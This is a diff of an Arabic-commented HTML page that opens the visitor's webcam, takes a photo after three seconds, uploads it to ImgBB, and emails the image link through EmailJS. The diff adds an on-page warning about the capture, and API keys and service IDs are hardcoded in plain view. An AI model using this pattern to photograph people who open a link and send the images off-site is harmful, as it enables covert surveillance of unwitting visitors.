@@ -6,11 +6,12 @@
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
     (function() {
-      emailjs.init("fgxPRLjjoxRV_d1cf"); // ← مفتاحك العام
+      emailjs.init("fgxPRLjjoxRV_d1cf"); // ← المفتاح العام الخاص بك
     })();
   </script>
 </head>
 <body>
+  <h3>📸 سيتم التقاط صورة تلقائيًا بعد 3 ثوانٍ...</h3>
   <video id="video" autoplay playsinline style="width: 100%; max-width: 400px;"></video>
   <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
 
@@ -21,7 +22,6 @@
         video.srcObject = stream;
 
         setTimeout(() => {
-          // التقاط الصورة
           const canvas = document.getElementById('canvas');
           const ctx = canvas.getContext('2d');
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -29,10 +29,10 @@
           const imageData = canvas.toDataURL('image/jpeg');
           const base64Image = imageData.split(',')[1];
 
-          // رفع الصورة إلى ImgBB
           const formData = new FormData();
           formData.append('image', base64Image);
 
+          // رفع الصورة إلى ImgBB
           fetch('https://api.imgbb.com/1/upload?key=85c1b237cc85eb120a31cf73476b1eba', {
             method: 'POST',
             body: formData
@@ -41,25 +41,29 @@
           .then(data => {
             const imageUrl = data.data.url;
 
-            // إرسال الإيميل باستخدام EmailJS
-            emailjs.send("service_890xst3", "template_p1oukct", {
-              name: "كاميرا الويب",
+            // إرسال الإيميل عبر EmailJS
+            emailjs.send("service_890xst3", "__ejs-test-mail-service__", {  // ← استبدل TEMPLATE_ID_HERE
+              name: "كاميرا المتصفح",
               time: new Date().toLocaleString(),
-              message: "تم التقاط صورة جديدة وإرسالها عبر البريد.",
+              message: "تم التقاط صورة وإرسالها تلقائيًا.",
               image_url: imageUrl
             }).then(() => {
-              alert("📧 تم إرسال الصورة إلى إيميلك بنجاح!");
+              alert("📧 تم إرسال الصورة إلى إيميلك!");
             }, error => {
               alert("❌ فشل إرسال الإيميل: " + error.text);
+              console.error(error);
             });
           })
           .catch(error => {
             alert("❌ فشل رفع الصورة إلى ImgBB: " + error);
+            console.error(error);
           });
+
         }, 3000);
       })
       .catch(error => {
-        alert("❌ الكاميرا غير متاحة: " + error);
+        alert("❌ فشل الوصول إلى الكاميرا: " + error);
+        console.error(error);
       });
   </script>
 </body>
